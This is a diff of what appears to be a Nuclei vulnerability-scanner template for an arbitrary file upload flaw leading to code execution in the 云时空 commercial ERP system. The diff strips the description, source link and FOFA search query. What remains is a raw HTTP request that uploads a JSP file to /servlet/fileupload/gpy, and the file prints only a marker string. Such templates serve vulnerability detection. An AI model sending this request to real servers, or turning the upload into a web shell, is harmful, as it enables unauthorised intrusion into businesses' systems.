@@ -3,12 +3,8 @@ info:
   name: 云时空社会化商业ERP系统gpy任意文件上传漏洞RCE
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qqag1gty50cso596'
+  description: ''
   tags: rce,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qqag1gty50cso596
-    fofa: app="云时空社会化商业ERP系统"
 http:
 - raw:
   - 'POST /servlet/fileupload/gpy HTTP/1.1
@@ -32,8 +28,6 @@ http:
     Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
 
 
-
-
     --4eea98d02AEa93f60ea08dE3C18A1388
 
 
@@ -41,8 +35,6 @@ http:
 
 
     Content-Type: application/octet-stream
-
-
 
 
     <% out.println("dudesuite"); %>
